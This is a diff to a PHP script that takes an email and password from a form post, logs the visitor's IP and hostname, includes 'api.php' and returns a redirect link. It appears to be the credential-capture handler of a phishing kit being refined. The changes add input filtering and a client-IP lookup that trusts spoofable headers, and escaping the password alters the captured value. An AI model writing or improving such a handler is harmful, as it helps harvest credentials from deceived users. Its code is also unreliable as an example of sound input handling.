@@ -1,7 +1,7 @@
 <?php
 include 'api.php';
-$email = trim($_POST['email']);
-$password = trim($_POST['password']);
+$email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
+$password = htmlspecialchars(trim($_POST['password']));
 if($email != null && $password != null){
 	$ip = getenv("REMOTE_ADDR");
 	$hostname = gethostbyaddr($ip);
@@ -38,5 +38,14 @@ $data = array(
         'redirect_link' => $redirect,
     );
     echo json_encode($data);
-
+function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+$ip = get_client_ip(); // Appel de la fonction
 ?>
